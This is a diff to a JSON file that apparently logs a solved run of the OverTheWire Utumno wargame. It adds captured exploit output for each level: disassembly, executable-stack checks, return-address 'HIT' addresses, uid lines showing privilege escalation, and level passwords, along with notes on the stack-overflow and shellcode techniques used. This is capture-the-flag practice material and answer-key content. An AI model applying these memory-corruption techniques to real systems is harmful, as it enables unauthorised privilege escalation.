@@ -28,10 +28,14 @@
     ]
    ],
    "out": [
-    "strings: Permission denied",
-    "objdump: Permission denied",
-    "readelf: not readable",
-    "Read me! :P"
+    "---x--x--- 1 utumno1 utumno0 12280 Oct 25 13:40 /utumno/utumno0",
+    "strings: /utumno/utumno0: Permission denied",
+    "objdump: /utumno/utumno0: Permission denied",
+    "nm: /utumno/utumno0: Permission denied",
+    "readelf: Error: Input file '/utumno/utumno0' is not readable.",
+    "Read me! :P",
+    "   2008 password: g0Vpiw3aZt",
+    " 804916c:\tc7 45 fc 08 a0 04 08 \tmov    DWORD PTR [ebp-0x4],0x804a008"
    ],
    "pw": "g0Vpiw3aZt"
   },
@@ -53,8 +57,10 @@
     ]
    ],
    "out": [
-    "GNU_STACK RWE",
-    "ASLR off"
+    "GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+    "0",
+    " 8049234:\t6a 00                 \tpush   0x0",
+    "uid=16002(utumno2) gid=16001(utumno1) groups=16001(utumno1)"
    ],
    "pw": "WaSwuXNhvg",
    "note": "the shellcode runs from the RWX page and prints the password file"
@@ -74,7 +80,10 @@
     ]
    ],
    "out": [
-    "Aw.."
+    "Aw..",
+    "HIT at 0xffffdcd0",
+    "PWN!uid=16003(utumno3) gid=16002(utumno2) groups=16002(utumno2)",
+    "uid=16003(utumno3) gid=16003(utumno3) groups=16003(utumno3)"
    ],
    "pw": "yiTcaZbpJ9"
   },
@@ -91,7 +100,13 @@
      "# sweep the return address, re-run the hit"
     ]
    ],
-   "out": [],
+   "out": [
+    "GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+    "0",
+    "HIT at 0xffffdf64",
+    "PWN!06nx2CS7rS",
+    "uid=16004(utumno4) gid=16004(utumno4) groups=16004(utumno4)"
+   ],
    "pw": "06nx2CS7rS",
    "note": "the signed-char write redirects the return address to shellcode in argv[0]"
   },
@@ -112,9 +127,14 @@
     ]
    ],
    "out": [
-    "rc=139 (segfault)",
-    "GNU_STACK RWE",
-    "ASLR off"
+    "Segmentation fault         /utumno/utumno4 < /dev/null",
+    " 80491bb:\t66 89 45 fa           \tmov    WORD PTR [ebp-0x6],ax",
+    " 80491bf:\t66 83 7d fa 3f        \tcmp    WORD PTR [ebp-0x6],0x3f",
+    " 80491da:\t8d 85 fe 00 ff ff     \tlea    eax,[ebp-0xff02]",
+    "GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+    "0",
+    "ZigV4d7wiU",
+    "uid=16005(utumno5) gid=16005(utumno5) groups=16005(utumno5)"
    ],
    "pw": "ZigV4d7wiU"
   },
@@ -131,7 +151,12 @@
      "# sweep the return address, re-run the hit"
     ]
    ],
-   "out": [],
+   "out": [
+    "GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+    "0",
+    "HIT at 0xffffdefc",
+    "uid=16006(utumno6) gid=16006(utumno6) groups=16006(utumno6)"
+   ],
    "pw": "HhEXDIzqg9",
    "note": "strncpy caps long strings at 20 bytes: ret is overwritten, shellcode stays in envp[8]"
   },
@@ -150,7 +175,13 @@
     ]
    ],
    "out": [
-    "Missing args"
+    "Missing args",
+    "Table position 1 has value -559038737",
+    "Description: hello",
+    "GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+    "0",
+    "V7U1ZvQCbP",
+    "uid=16007(utumno7) gid=16007(utumno7) groups=16007(utumno7)"
    ],
    "pw": "V7U1ZvQCbP"
   },
@@ -169,7 +200,11 @@
     ]
    ],
    "out": [
-    "lol ulrich && fuck hector"
+    "lol ulrich && fuck hector",
+    " 80491b6:\t8d 85 60 ff ff ff     \tlea    eax,[ebp-0xa0]",
+    " 80491dc:\t8d 85 e0 fe ff ff     \tlea    eax,[ebp-0x120]",
+    " 80491e3:\te8 78 fe ff ff        \tcall   8049060 <strcpy@plt>",
+    "uid=16008(utumno8) gid=16008(utumno8) groups=16008(utumno8)"
    ],
    "pw": "2bvITuqzN4"
   }
